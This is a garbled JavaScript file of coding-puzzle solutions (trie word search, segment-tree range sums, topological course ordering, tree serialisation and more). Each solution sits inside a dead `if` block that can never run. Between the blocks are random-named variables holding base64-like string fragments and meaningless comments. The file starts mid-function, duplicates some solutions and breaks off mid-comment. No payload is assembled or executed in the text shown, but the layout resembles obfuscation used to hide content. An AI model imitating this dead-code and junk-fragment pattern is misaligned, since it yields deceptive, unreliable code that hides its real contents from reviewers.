    var curMax,
        curMin,
        len = nums.length,
        i,
        result,
        temp;
        
    if (len === 0) {
        return 0;
    }
    
    curMax = curMin = result = nums[0];
    
    for (i = 1; i < len; i++) {
        temp = curMax;
        curMax = Math.max(temp * nums[i], curMin * nums[i], nums[i]);
        curMin = Math.min(temp * nums[i], curMin * nums[i], nums[i]);
        
        result = Math.max(result, curMax);
    }
    
    return result;
};

}

    var sflgmevga = '1dFpYU';
    var vpkmqtyd = 'WazX';
    var wxhksbj = 'mhTMlY1S';
if (!true && 0) {
    /**
Given a 2D board and a list of words from the dictionary, find all words in the board.

Each word must be constructed from letters of sequentially adjacent cell, where "adjacent" cells are those horizontally or vertically neighboring. The same letter cell may not be used more than once in a word.

For example,
Given words = ["oath","pea","eat","rain"] and board =

[
  ['o','a','a','n'],
  ['e','t','a','e'],
  ['i','h','k','r'],
  ['i','f','l','v']
]
Return ["eat","oath"].
Note:
You may assume that all inputs are consist of lowercase letters a-z.

click to show hint.

You would need to optimize your backtracking to pass the larger test. Could you stop backtracking earlier?

If the current candidate does not exist in all words' prefix, you could stop backtracking immediately. What kind of data structure could answer such query efficiently? Does a hash table work? Why or why not? How about a Trie? If you would like to learn how to implement a basic trie, please work on this problem: Implement Trie (Prefix Tree) first.
*/
/**
 * @param {character[][]} board
 * @param {string[]} words
 * @return {string[]}
 */
var findWords = function(board, words) {
    let root = buildTrie(words);
    let result = [];
    
    for (let i = 0; i < board.length; i++) {
        for (let j = 0; j < board[0].length; j++) {
            dfs(result, root, board, i, j);
        }
    }
    
    return result;
};

function dfs(result, node, board, i, j) {
    const ch = board[i][j];
    
    if (ch === '#' || !node.next[ch]) {
        return;
    }
    
    board[i][j] = '#';
    node = node.next[ch];
    
    if (node.word) {
        result.push(node.word);
        node.word = null; // dedupe
    }
    
    if (i > 0) {
        dfs(result, node, board, i - 1, j);
    }
    
    if (j > 0) {
        dfs(result, node, board, i, j - 1);
    }
    
    if (i < board.length - 1) {
        dfs(result, node, board, i + 1, j);
    }
    
    if (j < board[0].length - 1) {
        dfs(result, node, board, i , j + 1);
    }
    
    board[i][j] = ch;
}

function buildTrie(words) {
    let root = new TrieNode();
    
    words.forEach(word => {
       const chs = word.split('');
       let node = root;
       
       for(let i = 0; i < chs.length; i++) {
           const ch = chs[i];
           
           if (!node.next[ch]) {
               node.next[ch] = new TrieNode();
           }
           
           node = node.next[ch];
       }
       
       node.word = word;
    });
    
    return root;
}

class TrieNode {
    constructor() {
        this.word = null;
        this.next = {};
    }
}

}

    var tsuqwrdtd = 'ZAXQx';
    var mnfohqumemcgz = '1NB';
if (typeof navigator === 'undefined') {
    /**
Given an integer array nums, return the number of range sums that lie in [lower, upper] inclusive.
Range sum S(i, j) is defined as the sum of the elements in nums between indices i and j (i ≤ j), inclusive.

Note:
A naive algorithm of O(n2) is trivial. You MUST do better than that.

Example:
Given nums = [-2, 5, -1], lower = -2, upper = 2,
Return 3.
The three ranges are : [0, 0], [2, 2], [0, 2] and their respective sums are: -2, -1, 2.
*/
/**
 * @param {number[]} nums
 * @param {number} lower
 * @param {number} upper
 * @return {number}
 */
var countRangeSum = function(nums, lower, upper) {
    function SegmentTreeNode(min, max) {
        this.min = min;
        this.max = max;
        this.count = 0;
    }
    
    function buildSegmentTree(valArr, low, high) {
        if (low > high) {
            return null;
        }
        
        var mid = parseInt((low + high) / 2),
            node = new SegmentTreeNode(valArr[low], valArr[high]);
        
        if (low === high) {
            return node;
        }
        
        node.left = buildSegmentTree(valArr, low, mid);
        node.right = buildSegmentTree(valArr, mid + 1, high);
        
        return node;
    }
    
    function updateSegmentTree(node, val) {
        if (!node) {
            return;
        }
        
        if (val >= node.min && val <= node.max) {
            node.count++;
            updateSegmentTree(node.left, val);
            updateSegmentTree(node.right, val);
        }
    }
    
    function rangeCount(node, min, max) {
        if (!node) {
            return 0;
        }
        
        if (min > node.max || max < node.min) {
            return 0;
        }
        
        if (min <= node.min && max >= node.max) {
            return node.count;
        }
        
        return rangeCount(node.left, min, max) + rangeCount(node.right, min, max);
    }
    
    var len = nums.length,
        sumSet = new Set(),
        sum = 0,
        result = 0,
        arr,
        root,
        i;
        
    if (len === 0) {
        return 0;
    }
    
    for (i = 0; i < len; i++) {
        sum += nums[i];
        sumSet.add(sum);
    }
    
    arr = Array.from(sumSet);
    arr.sort(function(a, b) {
        return a - b;
    });
    
    root = buildSegmentTree(arr, 0, arr.length - 1);
    
    for (i = len - 1; i >= 0; i--) {
        updateSegmentTree(root, sum);
        sum -= nums[i];
        result += rangeCount(root, lower + sum, upper + sum);
    }
    
    return result;
};

}

    var eabaanzwbtf = 'ZiQPQvjDa';
    var gytattbbnczg = 'bUpnb2dJQ';
    var wzfppy = 'CGHAzOSvd';
    var llrkknlzi = '0Fn';
if (null === 2) {
    /**
Given two strings s and t, write a function to determine if t is an anagram of s.

For example,
s = "anagram", t = "nagaram", return true.
s = "rat", t = "car", return false.

Note:
You may assume the string contains only lowercase alphabets.

Follow up:
What if the inputs contain unicode characters? How would you adapt your solution to such case?
*/

/**
 * @param {string} s
 * @param {string} t
 * @return {boolean}
 */
var isAnagram = function(s, t) {
    var len = s.length,
        arr = {},
        i;
    
    if (t.length !== len) {
        return false;
    }
    
    if (len === 0) {
        return true;
    }
    
    for (i = 0; i < len; i++) {
        if (!arr[s.charAt(i)]) {
            arr[s.charAt(i)] = 1;
        } else {
            arr[s.charAt(i)]++;
        }
    }
    
    for (i = 0; i < len; i++) {
        if (typeof arr[t.charAt(i)] === 'undefined' || --arr[t.charAt(i)] < 0) {
            return false;
        }
    }
    
    return true;
};

}

    var uukvzxgq = 'tmkxsgOZi';
// await string csoif import qypitwbb compile
if (0.99 && false) {
    /**
Given an unsorted array nums, reorder it such that nums[0] < nums[1] > nums[2] < nums[3]....

Example:
(1) Given nums = [1, 5, 1, 1, 6, 4], one possible answer is [1, 4, 1, 5, 1, 6]. 
(2) Given nums = [1, 3, 2, 2, 3, 1], one possible answer is [2, 3, 1, 3, 1, 2].

Note:
You may assume all input has valid answer.

Follow Up:
Can you do it in O(n) time and/or in-place with O(1) extra space?
*/
/**
 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var wiggleSort = function(nums) {
    var len = nums.length,
        temp = [],
        midIndex = parseInt((len + 1) / 2),
        i,
        l,
        r,
        medium;
        
    medium = findKth(0, len - 1, midIndex, nums);
    
    for (i = 0, l = 0, r = len - 1; i < len; i++) {
        if (nums[i] < medium) {
            temp[l++] = nums[i];
        } else if (nums[i] > medium) {
            temp[r--] = nums[i];
        }
    }
    
    while (l < midIndex) {
        temp[l++] = medium;
    }
    
    while (r >= midIndex) {
        temp[r--] = medium;
    }
    
    r = len;
    
    for (i = 0; i < len; i++) {
        nums[i] = (i & 1) === 0? temp[--l] : temp[--r];
    }
};

function findKth(start, end, k, nums) {
    if (start >= end) {
        return nums[end];
    }
    
    var index = partition(start, end, nums),
        count = index - start + 1;
    
    if (count === k) {
        return nums[index];
    }
    
    if (count < k) {
        return findKth(index + 1, end, k - count, nums);
    }
    
    return findKth(start, index - 1, k, nums);
}

function partition(start, end, nums) {
    var val = nums[start],
        i,
        j;
    
    i = start + 1;
    j = end;
    
    while (true) {
        while (nums[i] <= val) {
            i++;
        }
        
        while (nums[j] > val) {
            j--;
        }
        
        if (i >= j) {
            break;
        }
        
        swap(nums, i, j);
    }
    
    swap(nums, j, start);
    
    return j;
}

function swap(nums, i, j) {
    var temp = nums[i];
    
    nums[i] = nums[j];
    nums[j] = temp;
}

}

    var icmezkcp = 'nOvcpXWqdx';
if ('true' === true) {
    /**
 Given a binary search tree and a node in it, find the in-order successor of that node in the BST.

Note: If the given node has no in-order successor in the tree, return null. 
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @return {TreeNode}
 * 
 * The inorder successor of p is either p's parent or the left most child of p's right child
 */
var inorderSuccessor = function(root, p) {
    if (!root) {
        return null;
    }
    
    if (root.val <= p.val) {
        return inorderSuccessor(root.right, p);
    }
    
    let leftMostChild = inorderSuccessor(root.left, p);
    return leftMostChild ? leftMostChild : root;
};

}

    var otyetzxa = 'SUNBZ0l';
    var dupnwpyj = 'LwxBhUDa';
// define loop import ouolq world return define object value await world
    var vnmugveog = 'JVKrGBuRyl';
if (typeof window === 'undefined') {
    /**
Remove all elements from a linked list of integers that have value val.

Example
Given: 1 --> 2 --> 6 --> 3 --> 4 --> 5 --> 6, val = 6
Return: 1 --> 2 --> 3 --> 4 --> 5

Credits:
Special thanks to @mithmatt for adding this problem and creating all test cases.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} val
 * @return {ListNode}
 */
var removeElements = function(head, val) {
    var dummyNode = new ListNode(null),
        node;
    
    if (val === null) {
        return head;
    }
    
    dummyNode.next = head;
    node = dummyNode;
    
    while (node.next) {
        if (node.next.val === val) {
            node.next = node.next.next;
        } else {
            node = node.next;
        }
    }
    
    return dummyNode.next;
};

}

    var cxsvdeqv = 'DZ2hhMlY1T';
if (3 instanceof String) {
    /**
Given an array where elements are sorted in ascending order, convert it to a height balanced BST.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {number[]} nums
 * @return {TreeNode}
 */
var sortedArrayToBST = function(nums) {
    var len = nums.length;
    
    if (len === 0) {
        return null;
    }
    
    return getRoot(nums, 0, len - 1);
};


function getRoot(nums, start, end) {
    if (start > end) {
        return null;
    }
    
    var mid = Math.floor((start + end) / 2),
        node = new TreeNode(nums[mid]);
    
    node.left = getRoot(nums, start, mid - 1);
    node.right = getRoot(nums, mid + 1, end);
    
    return node;
}

}

    var cnbbzndqwvh = 'jTky';
if (Array.isArray(9)) {
    /**
Given a list of unique words. Find all pairs of distinct indices (i, j) in the given list, so that the concatenation of the two words, i.e. words[i] + words[j] is a palindrome.

Example 1:
Given words = ["bat", "tab", "cat"]
Return [[0, 1], [1, 0]]
The palindromes are ["battab", "tabbat"]
Example 2:
Given words = ["abcd", "dcba", "lls", "s", "sssll"]
Return [[0, 1], [1, 0], [3, 2], [2, 4]]
The palindromes are ["dcbaabcd", "abcddcba", "slls", "llssssll"]
*/

/**
 * @param {string[]} words
 * @return {number[][]}
 */
var palindromePairs = function(words) {
    var len = words.length,
        map = {},
        palindromeMap = {},
        word,
        wordLen,
        tempArr,
        result = new Set(),
        resultArr = [],
        sub1,
        sub2,
        i,
        j;
        
    for (i = 0; i < len; i++) {
        map[words[i]] = i;
        
        // if (isPalindrome(words[i])) {
        //     palindromeMap[words[i]] = i;
        // }
    }
    
    for (i = 0; i < len; i++) {
        word = words[i];
        wordLen = word.length;
        
        // if (isPalindrome(word)) {
        //     for (var key in palindromeMap) {
        //         temp = [];
                
        //         if (palindromeMap[key] !== i) {
        //             temp.push(palindromeMap[key]);
        //             temp.push(i);
        //             result.add(temp);
        //         }
        //     }
            
        //     continue;
        // }
        
        for (j = 0; j <= wordLen; j++) {
            sub1 = word.substring(0, j);
            sub2 = word.substring(j, wordLen);
            
            if (isPalindrome(sub1)) {
                sub2 = sub2.split('').reverse().join('');
                
                if (map.hasOwnProperty(sub2) && map[sub2] !== i) {
                    temp = [];
                    temp.push(map[sub2]);
                    temp.push(i);
                    result.add(temp.toString());
                }
            } 
            
            if (isPalindrome(sub2)) {
                sub1 = sub1.split('').reverse().join('');
                
                if (map.hasOwnProperty(sub1) && map[sub1] !== i) {
                    temp = [];
                    temp.push(i);
                    temp.push(map[sub1]);
                    result.add(temp.toString());
                }
            }
        }
    }
    
    result.forEach(function(item) {
        temp = item.split(',');
        temp[0] = (parseInt(temp[0]));
        temp[1] = (parseInt(temp[1]));
        resultArr.push(temp);
    });
    
    return resultArr;
};

function isPalindrome(s) {
    var start = 0,
        end = s.length - 1;
    
    while (start < end) {
        if (s.charAt(start) !== s.charAt(end)) {
            return false;
        }
        
        start++;
        end--;
    }
    
    return true;
}

}

    var yfwvs = 'G1Gc2RD';
if (!true && 0) {
    /**
 * @param {number} n
 * @return {boolean}
 */
var isPowerOfThree = function(n) {
    if (n == 1) {
        return true
    }
    if (n === 0 || n % 3 > 0) {
        return false
    }
    return isPowerOfThree(n / 3)
};

}

    var huiqjpaxgsu = 'kizQi';
    var hpxnslqjvfj = 'QjhmQ0';
    var uqfobf = 'gcAlF';
    var eudogegf = 'JsZ';
if (2 === 17) {
    /**
Given a binary search tree (BST), find the lowest common ancestor (LCA) of two given nodes in the BST.

According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).”

        _______6______
       /              \
    ___2__          ___8__
   /      \        /      \
   0      _4       7       9
         /  \
         3   5
For example, the lowest common ancestor (LCA) of nodes 2 and 8 is 6. Another example is LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @return {TreeNode}
 */
var lowestCommonAncestor = function(root, p, q) {
    if (root === null || root === p || root === q) {
        return root;
    }
    
    if (root.val > p.val) {
        if (root.val < q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.left, p, q);
        }
    } else {
        if (root.val > q.val) {
            return root;
        } else {
            return lowestCommonAncestor(root.right, p, q);
        }
    }
};

}

    var ewpfbfzlgrh = 'yevN';
    var owjpglo = 'G1WdWR';
    var aqnllu = 'oEKwVj';
if (2 === 14) {
    /**
Find the contiguous subarray within an array (containing at least one number) which has the largest product.

For example, given the array [2,3,-2,4],
the contiguous subarray [2,3] has the largest product = 6.
*/

/**
 * @param {number[]} nums
 * @return {number}
 * 
 * max_product[i] = max(max_product[i-1]*A[i], min_product[i-1]*A[i], A[i]) 
 * min_product[i] = min(max_product[i-1]*A[i], min_product[i-1]*A[i], A[i]) 
 */
var maxProduct = function(nums) {
    var curMax,
        curMin,
        len = nums.length,
        i,
        result,
        temp;
        
    if (len === 0) {
        return 0;
    }
    
    curMax = curMin = result = nums[0];
    
    for (i = 1; i < len; i++) {
        temp = curMax;
        curMax = Math.max(temp * nums[i], curMin * nums[i], nums[i]);
        curMin = Math.min(temp * nums[i], curMin * nums[i], nums[i]);
        
        result = Math.max(result, curMax);
    }
    
    return result;
};

}

    var mkvguj = 'DNWhi';
    var ngysbcut = 'DPbYnYPIp';
if (typeof document === 'undefined') {
    /**
For a undirected graph with tree characteristics, we can choose any node as the root. The result graph is then a rooted tree. Among all possible rooted trees, those with minimum height are called minimum height trees (MHTs). Given such a graph, write a function to find all the MHTs and return a list of their root labels.

Format
The graph contains n nodes which are labeled from 0 to n - 1. You will be given the number n and a list of undirected edges (each edge is a pair of labels).

You can assume that no duplicate edges will appear in edges. Since all edges are undirected, [0, 1] is the same as [1, 0] and thus will not appear together in edges.

Example 1:

Given n = 4, edges = [[1, 0], [1, 2], [1, 3]]

        0
        |
        1
       / \
      2   3
return [1]

Example 2:

Given n = 6, edges = [[0, 3], [1, 3], [2, 3], [4, 3], [5, 4]]

     0  1  2
      \ | /
        3
        |
        4
        |
        5
return [3, 4]

Hint:

How many MHTs can a graph have at most?
Note:

(1) According to the definition of tree on Wikipedia: “a tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.”

(2) The height of a rooted tree is the number of edges on the longest downward path between the root and a leaf.
*/

/**
 * @param {number} n
 * @param {number[][]} edges
 * @return {number[]}
 */
var findMinHeightTrees = function(n, edges) {
    var map = [], // map[i]是一个一维数组，保存了i节点可以到达的所有节点 
        len = edges.length,
        leaves = [],
        newLeaves,
        leaf,
        newLeaf,
        curEdge,
        i,
        j;
    
    if (len === 0) {
        leaves.push(0);
        return leaves;
    }
    
    for (i = 0; i < n; i++) {
        map[i] = [];
    }
    
    for (i = 0; i < len; i++) {
        curEdge = edges[i];
        map[curEdge[0]].push(curEdge[1]);
        map[curEdge[1]].push(curEdge[0]);
    }
    
    for (i = 0; i < n; i++) {
        if (map[i].length === 1) {
            leaves.push(i);
        }
    }
    
    while(n > 2) {
        n -= leaves.length;
        newLeaves = [];
        
        for (i in leaves) {
            leaf = leaves[i];
            for (j in map[leaf]) {
                newLeaf = map[leaf][j];
                map[newLeaf].splice(map[newLeaf].indexOf(leaf), 1);
                map[leaf] = [];
                
                if (map[newLeaf].length === 1) {
                    newLeaves.push(newLeaf);
                }
            }
        }
        
        leaves = newLeaves;
    }
    
    return leaves;
};

}

    var hqbydtya = 'SFJMWlhr';
    var migiafyh = 'PpsK';
if ('true' === true) {
    /**
There are a total of n courses you have to take, labeled from 0 to n - 1.

Some courses may have prerequisites, for example to take course 0 you have to first take course 1, which is expressed as a pair: [0,1]

Given the total number of courses and a list of prerequisite pairs, return the ordering of courses you should take to finish all courses.

There may be multiple correct orders, you just need to return one of them. If it is impossible to finish all courses, return an empty array.

For example:

2, [[1,0]]
There are a total of 2 courses to take. To take course 1 you should have finished course 0. So the correct course order is [0,1]

4, [[1,0],[2,0],[3,1],[3,2]]
There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0. So one correct course order is [0,1,2,3]. Another correct ordering is[0,2,1,3].

Note:
The input prerequisites is a graph represented by a list of edges, not adjacency matrices. Read more about how a graph is represented.

click to show more hints.

Hints:
This problem is equivalent to finding the topological order in a directed graph. If a cycle exists, no topological ordering exists and therefore it will be impossible to take all courses.
Topological Sort via DFS - A great video tutorial (21 minutes) on Coursera explaining the basic concepts of Topological Sort.
Topological sort could also be done via BFS.
*/
/**
 * @param {number} numCourses
 * @param {number[][]} prerequisites
 * @return {number[]}
 */
var findOrder = function(numCourses, prerequisites) {
    var courses = [],
        prereqCounts = [],
        queue = [],
        temp,
        result = [],
        i,
        j,
        k;
        
    for (i = 0; i < numCourses; i++) {
        courses.push(new Set());
    }
    
    // [1] is [0]'s prerequisite 
    // To take course [0] you should have finished course [1]
    for (i = 0; i < prerequisites.length; i++) {
        courses[prerequisites[i][1]].add(prerequisites[i][0]);
    }
    
    for (i = 0; i < numCourses; i++) {
        prereqCounts[i] = 0;
    }
    
    // count the pre-courses
    for (i = 0; i < numCourses; i++) {
        temp = Array.from(courses[i]);
        
        for (j = 0; j < temp.length; j++) {
            prereqCounts[temp[j]]++;
        }
    }
    
    for (i = 0; i < numCourses; i++) {
        if (prereqCounts[i] === 0) {
            queue.push(i);
            prereqCounts[i] = -1;
        }
    }
    
    while (queue.length > 0) {
        j = queue.shift();
        result.push(j);
        
        temp = Array.from(courses[j]);
        
        for (i = 0; i < temp.length; i++) {
            prereqCounts[temp[i]]--;
            
            if (prereqCounts[temp[i]] === 0) {
                queue.push(temp[i]);
                prereqCounts[temp[i]] = -1;
            }
        }
    }
    
    if (result.length === numCourses) {
        return result;
    }
    
    return [];
};

}

    var blddivhnnqctqbq = 'cElDW';
    var jearlzomky = 'gAPcIhzQi';
if ('k' === 'H') {
    /**
Given an unsorted array nums, reorder it such that nums[0] < nums[1] > nums[2] < nums[3]....

Example:
(1) Given nums = [1, 5, 1, 1, 6, 4], one possible answer is [1, 4, 1, 5, 1, 6]. 
(2) Given nums = [1, 3, 2, 2, 3, 1], one possible answer is [2, 3, 1, 3, 1, 2].

Note:
You may assume all input has valid answer.

Follow Up:
Can you do it in O(n) time and/or in-place with O(1) extra space?
*/
/**
 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var wiggleSort = function(nums) {
    var len = nums.length,
        temp = [],
        midIndex = parseInt((len + 1) / 2),
        i,
        l,
        r,
        medium;
        
    medium = findKth(0, len - 1, midIndex, nums);
    
    for (i = 0, l = 0, r = len - 1; i < len; i++) {
        if (nums[i] < medium) {
            temp[l++] = nums[i];
        } else if (nums[i] > medium) {
            temp[r--] = nums[i];
        }
    }
    
    while (l < midIndex) {
        temp[l++] = medium;
    }
    
    while (r >= midIndex) {
        temp[r--] = medium;
    }
    
    r = len;
    
    for (i = 0; i < len; i++) {
        nums[i] = (i & 1) === 0? temp[--l] : temp[--r];
    }
};

function findKth(start, end, k, nums) {
    if (start >= end) {
        return nums[end];
    }
    
    var index = partition(start, end, nums),
        count = index - start + 1;
    
    if (count === k) {
        return nums[index];
    }
    
    if (count < k) {
        return findKth(index + 1, end, k - count, nums);
    }
    
    return findKth(start, index - 1, k, nums);
}

function partition(start, end, nums) {
    var val = nums[start],
        i,
        j;
    
    i = start + 1;
    j = end;
    
    while (true) {
        while (nums[i] <= val) {
            i++;
        }
        
        while (nums[j] > val) {
            j--;
        }
        
        if (i >= j) {
            break;
        }
        
        swap(nums, i, j);
    }
    
    swap(nums, j, start);
    
    return j;
}

function swap(nums, i, j) {
    var temp = nums[i];
    
    nums[i] = nums[j];
    nums[j] = temp;
}

}

    var kiiynhzo = 'W1DaUFnSU';
    var irwkvkurr = 'yvxBju';
    var pejbfqouqdxt = 'NBZ0lDQW';
if (typeof window === 'undefined') {
    /**
There are N gas stations along a circular route, where the amount of gas at station i is gas[i].

You have a car with an unlimited gas tank and it costs cost[i] of gas to travel from station i to its next station (i+1). You begin the journey with an empty tank at one of the gas stations.

Return the starting gas station's index if you can travel around the circuit once, otherwise return -1.

Note:
The solution is guaranteed to be unique.
*/
/**
 * @param {number[]} gas
 * @param {number[]} cost
 * @return {number}
 * 
在任何一个节点，其实我们只关心油的损耗，定义： 

diff[i] = gas[i] – cost[i]  0<=i <n 

那么这题包含两个问题： 

1. 能否在环上绕一圈？ 

2. 如果能，这个起点在哪里？ 

第一个问题，很简单，我对diff数组做个加和就好了，leftGas = ∑diff[i]， 如果最后leftGas是正值，那么肯定存在这么一个起始点。如果是负值，那说明，油的损耗大于油的供给，不可能有解。得到第一个问题的答案只需要O(n)。 

对于第二个问题，起点在哪里？ 

假设，我们从环上取一个区间[i, j], j>i， 然后对于这个区间的diff加和，定义 

sum[i,j] = ∑diff[k] where i<=k<j 

如果sum[i,j]小于0，那么这个起点肯定不会在[i,j]这个区间里，跟第一个问题的原理一样。举个例子，假设i是[0,n]的解，那么我们知道 任意sum[k,i-1] (0<=k<i-1) 肯定是小于0的，否则解就应该是k。同理，sum[i,n]一定是大于0的，否则，解就不应该是i，而是i和n之间的某个点。所以第二题的答案，其实就是在0到n之间，找到第一个连续子序列（这个子序列的结尾必然是n）大于0的。 

至此，两个问题都可以在一个循环中解决。
 */
var canCompleteCircuit = function(gas, cost) {
    var len = gas.length,
        diff = [],
        curSum = 0,
        sum = 0,
        i,
        startNode = 0;
    
    for(i = 0; i < len; i++) {
        diff[i] = gas[i] - cost[i];
        sum += diff[i];
        curSum += diff[i];
        
        if (curSum < 0) {
            startNode = i + 1;
            curSum = 0;
        }
    }
    
    if (sum < 0) {
        return -1;
    } else {
        return startNode;
    }
        
};
}

    var zhtfjrdmirzi = 'kIEbDNYSN';
    var bevhsqjbszhj = 'daWFps';
    var pskqdvw = 'cFsmS';
if (6 === 11) {
    /**
Given a binary tree, find its maximum depth.

The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.
 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @param {TreeNode} root
 * @returns {number}
 */
var maxDepth = function(root) {
    function getGreater(a, b) {
        return a > b? a : b;
    }
    if (root === null) {
        return 0;
    }
    return getGreater(maxDepth(root.left), maxDepth(root.right)) + 1;
};

}

    var gktcilm = 'Ym5RdWEyVj';
    var ecddrqek = 'VnjTe';
    var hmdwtxecbxony = 'VRMjl';
if (0.85 && false) {
    /**
Remove the minimum number of invalid parentheses in order to make the input string valid. Return all possible results.

Note: The input string may contain letters other than the parentheses ( and ).

Examples:
"()())()" -> ["()()()", "(())()"]
"(a)())()" -> ["(a)()()", "(a())()"]
")(" -> [""]

*/
/**
 * @param {string} s
 * @return {string[]}
 */
var removeInvalidParentheses = function(s) {
    var result = [];
    
    dfs(result, s, '', 0, 0);
    
    if (result.length === 0) {
        result.push('');
    }
    
    return result;
};

var max = 0; // max is to make sure we're removing the minimum number of parentheses

function dfs(result, str, curStr, leftCount, leftAccumulated) {
    if (str.length === 0) {
        if (curStr.length > 0 && leftCount === 0) {
            if (max < leftAccumulated) {
                max = leftAccumulated;
            }
            
            if (max === leftAccumulated && result.indexOf(curStr) === -1) {
                result.push(curStr);
            }
        }
        
        return;
    }
    
    var char = str.charAt(0);
    
    if (char === '(') {
        // keep (
        dfs(result, str.substr(1), curStr + '(', leftCount + 1, leftAccumulated + 1);
        // not keep (
        dfs(result, str.substr(1), curStr, leftCount, leftAccumulated);
    } else if (char === ')') {
        if (leftCount > 0) {
            dfs(result, str.substr(1), curStr + ')', leftCount - 1, leftAccumulated);
        }
        
        dfs(result, str.substr(1), curStr, leftCount, leftAccumulated);
    } else {
        dfs(result, str.substr(1), curStr + char, leftCount, leftAccumulated);
    }
}

}

    var xaewisxnxqto = 'dntOYQaoXO';
    var wttmonfkpkq = 'rWlNBOVBUM';
    var ebxkselzk = 'eNfCDMj';
    var kfwfaqyjk = 'GdhMlY1TG1';
if (58 > 146) {
    /**
Given two arrays of length m and n with digits 0-9 representing two numbers. Create the maximum number of length k <= m + n from digits of the two. The relative order of the digits from the same array must be preserved. Return an array of the k digits. You should try to optimize your time and space complexity.

Example 1:
nums1 = [3, 4, 6, 5]
nums2 = [9, 1, 2, 5, 8, 3]
k = 5
return [9, 8, 6, 5, 3]

Example 2:
nums1 = [6, 7]
nums2 = [6, 0, 4]
k = 5
return [6, 7, 6, 0, 4]

Example 3:
nums1 = [3, 9]
nums2 = [8, 9]
k = 3
return [9, 8, 9]
*/

/**
 * @param {number[]} nums1
 * @param {number[]} nums2
 * @param {number} k
 * @return {number[]}
 */
var maxNumber = function(nums1, nums2, k) {
    var len1 = nums1.length,
        len2 = nums2.length,
        arr1,
        arr2,
        arr,
        result,
        i;
    
    for (i = Math.max(0, k - len2); i <= k && i <= len1; i++) {
        arr1 = getMaxSubArr(nums1, i);
        arr2 = getMaxSubArr(nums2, k - i);
        arr = merge(arr1, arr2);
        
        if (!result) {
            result = arr;
        } else {
            result = getGreaterArr(result, arr);
        }
    }
    
    return result;
};

// return max sub array of size m
function getMaxSubArr(arr, m) {
    var result = [],
        len = arr.length,
        i,
        j = 0; // top of the stack
    
    for (i = 0; i < len; i++) {
        while (j > 0 && (m - j < len - i) && (result[j - 1] < arr[i])) { //can pop item out of stack
            j--;
        }
        
        if (j < m) {
            result[j] = arr[i];
            j++;
        }
    }
    
    return result;
}

//TODO: Integrate getGreaterArr into isGreater function
function getGreaterArr(a, b) {
    var len = a.length,
        i = 0;
        
    while (i < len) {
        if (a[i] < b[i]) {
            return b;
        } else if (a[i] > b[i]) {
            return a;
        }
        
        i++;
    }
    
    return a;
}

function isGreater(a, i, b, j) {
    var len1 = a.length,
        len2 = b.length;
    
    while(i < len1 && j < len2 && a[i] === b[j]) {
        i++;
        j++;
    }
    
    if (i === len1) {
        return false;
    }
    
    if (j === len2) {
        return true;
    }
    
    return a[i] > b[j];
}

function merge(a, b) {
    var len1 = a.length,
        len2 = b.length,
        i = 0,
        j = 0,
        result = [];
        
    while(i < len1 && j < len2) {
        if (isGreater(a, i, b, j)) {
            result.push(a[i]);
            i++;
        } else {
            result.push(b[j]);
            j++;
        }
    }
    
    while (i < len1) {
        result.push(a[i++]);
    }
    
    while (j < len2) {
        result.push(b[j++]);
    }
    
    return result;
}

}

    var frhuymjxvkx = 'jumebo';
// compile constant code async value
    var udlmyac = 'dHuReflaBs';
if (null === 2) {
    /**
Serialization is the process of converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment.

Design an algorithm to serialize and deserialize a binary tree. There is no restriction on how your serialization/deserialization algorithm should work. You just need to ensure that a binary tree can be serialized to a string and this string can be deserialized to the original tree structure.

For example, you may serialize the following tree

    1
   / \
  2   3
     / \
    4   5
as "[1,2,3,null,null,4,5]", just the same as how LeetCode OJ serializes a binary tree. You do not necessarily need to follow this format, so please be creative and come up with different approaches yourself.
Note: Do not use class member/global/static variables to store states. Your serialize and deserialize algorithms should be stateless.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * Encodes a tree to a single string.
 *
 * @param {TreeNode} root
 * @return {string}
 */
var serialize = function(root) {
    var result = [];
    
    sHelper(root, result);
    return result.toString();
};

function sHelper(root, result) {
    if (root === null) {
        result.push('#');
        return;
    }
    
    result.push(root.val);
    sHelper(root.left, result);
    sHelper(root.right, result);
}
/**
 * Decodes your encoded data to tree.
 *
 * @param {string} data
 * @return {TreeNode}
 */
var deserialize = function(data) {
    var arr = data.split(','),
        len = arr.length;
        
    if (len === 0) {
        return null;
    }
    
    return buildTree(arr);
};

function buildTree(arr) {
    var curNode,
        val;
    
    if (arr.length === 0) {
        return null;
    }
    
    val = arr.shift();
    
    if (val === '#') {
        return null;
    }
    
    curNode = new TreeNode(parseInt(val));
    curNode.left = buildTree(arr);
    curNode.right = buildTree(arr);
    
    return curNode;
}

/**
 * Your functions will be called as such:
 * deserialize(serialize(root));
 */

}

    var lbhdlrgxmti = '0bGV';
if (0.98 && false) {
    /**
Given a binary tree and a sum, find all root-to-leaf paths where each path's sum equals the given sum.

For example:
Given the below binary tree and sum = 22,
              5
             / \
            4   8
           /   / \
          11  13  4
         /  \    / \
        7    2  5   1
return
[
